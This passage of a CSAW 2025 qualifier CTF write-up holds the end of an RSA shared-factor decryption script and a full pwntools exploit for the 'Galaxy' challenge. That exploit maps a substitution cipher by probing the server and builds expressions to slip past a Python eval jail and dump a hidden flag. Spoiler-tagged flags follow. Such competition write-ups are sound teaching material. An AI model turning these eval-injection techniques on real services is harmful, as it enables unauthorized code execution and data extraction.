+        print(f&quot;d_correct_2: {d_correct_2}n&quot;)
+
+        print(&quot;--- Decrypting given 'd' values as ciphertext ---&quot;)
+
+        try:
+            plaintext_1 = pow(d1, d_correct_1, n1)
+            flag_1 = long_to_bytes(plaintext_1)
+            print(f&quot;[+] Decrypted plaintext from d1: {flag_1}&quot;)
+        except Exception as ex:
+            print(f&quot;[-] Decryption failed for d1: {ex}&quot;)
+
+        try:
+            plaintext_2 = pow(d2, d_correct_2, n2)
+            flag_2 = long_to_bytes(plaintext_2)
+            print(f&quot;[+] Decrypted plaintext from d2: {flag_2}&quot;)
+        except Exception as ex:
+            print(f&quot;[-] Decryption failed for d2: {ex}&quot;)
+
+    else:
+        print(&quot;[-] Attack failed. n1 and n2 do not share a common factor.&quot;)
+
+
+solve()
+```
+
+## Flag
+
+:spoiler[`csawctf{wH04m1_70d3Ny_7r4D1710n_4820391578649021735}`]
+
+# Galaxy
+
+## Information
+
+- Category: Misc
+- Points: 500
+
+## Description
+
+&gt; Reach for the stars!
+
+## Write-up
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-816px">调</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-432px">教</span> AI <span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span>……<span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-288px">工</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-96px">具</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-304px">应</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-800px">该</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-400px">拿</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-176px">吗</span> LOL
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import context, process, remote, args
+import sys
+
+FILE = &quot;./main.py&quot;
+HOST, PORT = &quot;chals.ctf.csaw.io&quot;, 21009
+
+context(log_level=&quot;debug&quot;)
+
+alphabet = &quot;abcdefghijklmnopqrstuvwxyz'&quot;
+
+
+def launch():
+    global target
+    if args.L:
+        target = process([&quot;python3&quot;, FILE])
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    def send_recv_str(payload):
+        target.recvuntil(b&quot;&gt; &quot;, timeout=1)
+        target.sendline(payload.encode())
+        try:
+            line = target.recvline()
+            if not line:
+                return &quot;&quot;
+            return line.decode(errors=&quot;ignore&quot;).strip()
+        except Exception:
+            return &quot;&quot;
+
+    target.recvuntil(b&quot;&gt; &quot;)
+
+    apost_cipher = None
+    for c in alphabet:
+        # if ciphertext c -&gt; &quot;'&quot;, then c + &quot;[&quot; + c becomes &quot;'['&quot; after unwarp, e
+val(&quot;'['&quot;) -&gt; prints [
+        resp = send_recv_str(c + &quot;[&quot; + c)
+        if resp and &quot;[&quot; in resp and resp != &quot;no galaxy&quot;:
+            apost_cipher = c
+            target.info(
+                f&quot;Found apostrophe ciphertext: {apost_cipher!r} (response={resp!
+r})&quot;
+            )
+            break
+
+    if not apost_cipher:
+        target.failure(&quot;Could not find apostrophe ciphertext. Abort.&quot;)
+        target.close()
+        sys.exit(1)
+
+    # build cipher -&gt; plaintext mapping by probing apost_cipher + candidate + ap
+ost_cipher
+    cipher_to_plain = {}
+    for c in alphabet:
+        resp = send_recv_str(apost_cipher + c + apost_cipher)
+        # on success resp is printed plaintext character (single char)
+        if resp and resp != &quot;no galaxy&quot;:
+            cipher_to_plain[c] = resp[0]
+            target.debug(f&quot;cipher {c!r} -&gt; plain {cipher_to_plain[c]!r}&quot;)
+        else:
+            cipher_to_plain[c] = None
+
+    # the candidate that maps to &quot;'&quot; will have produced no valid eval (None).
+    # fill it explicitly using apost_cipher we discovered.
+    cipher_to_plain[apost_cipher] = &quot;'&quot;
+    target.info(f'Explicitly set cipher {apost_cipher!r} -&gt; plain &quot;'&quot;')
+
+    # invert mapping to get plaintext -&gt; ciphertext
+    plain_to_cipher = {}
+    for c, pch in cipher_to_plain.items():
+        if pch is not None:
+            # if multiple c map to same pch (shouldn't), last one wins — but map
+ping is bijection here
+            plain_to_cipher[pch] = c
+
+    # sanity check
+    missing = [ch for ch in alphabet if ch not in plain_to_cipher]
+    if missing:
+        target.warning(f&quot;Missing plaintext-&gt;cipher mappings for: {missing}&quot;)
+    else:
+        target.info(&quot;Recovered full plaintext-&gt;cipher mapping for a-z and apostr
+ophe.&quot;)
+
+    # helper to encrypt plaintext expression using mapping
+    def encrypt_plaintext(expr):
+        out = []
+        for ch in expr:
+            if ch in plain_to_cipher:
+                out.append(plain_to_cipher[ch])
+            else:
+                out.append(ch)
+        return &quot;&quot;.join(out)
+
+    # negative index expression using allowed chars only
+    def neg_expr(n):
+        &quot;&quot;&quot;
+        Build an expression that evaluates to -n using only allowed characters.
+        Use ~('a'&lt;'b') == -2 and ~('a'&lt;'a') == -1, combine with +.
+        &quot;&quot;&quot;
+        q = n // 2
+        r = n % 2
+        parts = [&quot;~('a'&lt;'b')&quot; for _ in range(q)]
+        if r:
+            parts.append(&quot;~('a'&lt;'a')&quot;)
+        return &quot;+&quot;.join(parts)
+
+    # ensure we can encrypt 'spiral' (all letters present)
+    for ch in &quot;spiral&quot;:
+        if ch not in plain_to_cipher:
+            target.failure(f&quot;Missing mapping for letter {ch!r}. Aborting.&quot;)
+            target.close()
+            sys.exit(1)
+    enc_spiral = encrypt_plaintext(&quot;spiral&quot;)
+    target.info(f&quot;Encrypted 'spiral' -&gt; {enc_spiral!r}&quot;)
+
+    # dump characters one-by-one using negative indices
+    flag_chars = []
+    MAX_CHARS = 80
+    for i in range(1, MAX_CHARS + 1):
+        idx_plain = neg_expr(i)
+        expr_plain = f&quot;spiral[{idx_plain}]&quot;
+        expr_cipher = encrypt_plaintext(expr_plain)
+        resp = send_recv_str(expr_cipher)
+        if not resp or resp == &quot;no galaxy&quot;:
+            target.info(f&quot;Index -{i} out-of-range or eval error (resp={resp!r}),
+ stop.&quot;)
+            break
+        ch = resp[0]
+        target.info(f&quot;got index -{i}: {repr(ch)}&quot;)
+        flag_chars.append(ch)
+
+    flag = &quot;&quot;.join(reversed(flag_chars))
+    target.success(f&quot;Recovered flag (partial/full): {flag}&quot;)
+
+    target.close()
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+```
+
+## Flag
+
+:spoiler[`csawctf{g@l@xy_0bserv3r$}`]
+</pre> <pre class="textmode-pre phile-pre phile-footer-pre">
+
+ret <a href="/volume/1/">&lt;volume_1&gt;</a>
+</pre> </article> <script type="module" src="/_astro/PhileShell.astro_astro_type_script_index_0_lang.CtuB20jf.js"></script>   </main>  <vercel-analytics data-props="{}" data-params="{&quot;volume&quot;:&quot;1&quot;,&quot;slug&quot;:&quot;csaw-25-quals&quot;}" data-pathname="/volume/1/csaw-25-quals/"></vercel-analytics> <script type="module">var v=()=>{window.va||(window.va=function(...i){window.vaq||(window.vaq=[]),window.vaq.push(i)})},w="@vercel/analytics",h="2.0.1";function f(){return typeof window<"u"}function l(){try{const e="production"}catch{}return"production"}function m(e="auto"){if(e==="auto"){window.vam=l();return}window.vam=e}function y(){return(f()?window.vam:l())||"production"}function d(){return y()==="development"}function b(e,i){if(!e||!i)return e;let n=e;try{const t=Object.entries(i);for(const[r,s]of t)if(!Array.isArray(s)){const o=u(s);o.test(n)&&(n=n.replace(o,`/[${r}]`))}for(const[r,s]of t)if(Array.isArray(s)){const o=u(s.join("/"));o.test(n)&&(n=n.replace(o,`/[...${r}]`))}return n}catch{return e}}function u(e){return new RegExp(`/${g(e)}(?=[/?#]|$)`)}function g(e){return e.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}function E(e){return e.scriptSrc?a(e.scriptSrc):d()?"https://va.vercel-scripts.com/v1/script.debug.js":e.basePath?a(`${e.basePath}/insights/script.js`):"/_vercel/insights/script.js"}function k(e,i){var n;let t=e;if(i)try{t={...(n=JSON.parse(i))==null?void 0:n.analytics,...e}}catch{}m(t.mode);const r={sdkn:w+(t.framework?`/${t.framework}`:""),sdkv:h};return t.disableAutoTrack&&(r.disableAutoTrack="1"),t.viewEndpoint&&(r.viewEndpoint=a(t.viewEndpoint)),t.eventEndpoint&&(r.eventEndpoint=a(t.eventEndpoint)),t.sessionEndpoint&&(r.sessionEndpoint=a(t.sessionEndpoint)),d()&&t.debug===!1&&(r.debug="false"),t.dsn&&(r.dsn=t.dsn),t.endpoint?r.endpoint=t.endpoint:t.basePath&&(r.endpoint=a(`${t.basePath}/insights`)),{beforeSend:t.beforeSend,src:E(t),dataset:r}}function a(e){return e.startsWith("http://")||e.startsWith("https://")||e.startsWith("/")?e:`/${e}`}function S(e={debug:!0},i){var n;if(!f())return;const{beforeSend:t,src:r,dataset:s}=k(e,i);if(v(),t&&((n=window.va)==null||n.call(window,"beforeSend",t)),document.head.querySelector(`script[src*="${r}"]`))return;const o=document.createElement("script");o.src=r;for(const[c,p]of Object.entries(s))o.dataset[c]=p;o.defer=!0,o.onerror=()=>{const c=d()?"Please check if any ad blockers are enabled and try again.":"Be sure to enable Web Analytics for your project and deploy again. See https://vercel.com/docs/analytics/quickstart for more information.";console.log(`[Vercel Web Analytics] Failed to load script from ${r}. ${c}`)},document.head.appendChild(o)}function $({route:e,path:i}){var n;(n=window.va)==null||n.call(window,"pageview",{route:e,path:i})}function A(){try{return}catch{}}function j(){try{return}catch{}}customElements.define("vercel-analytics",class extends HTMLElement{constructor(){super();try{const i=JSON.parse(this.dataset.props??"{}"),n=JSON.parse(this.dataset.params??"{}");S({...i,disableAutoTrack:!0,framework:"astro",basePath:A(),beforeSend:window.webAnalyticsBeforeSend},j());const t=this.dataset.pathname;$({route:b(t??"",n),path:t})}catch(i){throw new Error(`Failed to parse WebAnalytics properties: ${i}`)}}});</script> <script type="module" src="/_astro/BaseLayout.astro_astro_type_script_index_0_lang.GD05J9Fp.js"></script> </body> </html>
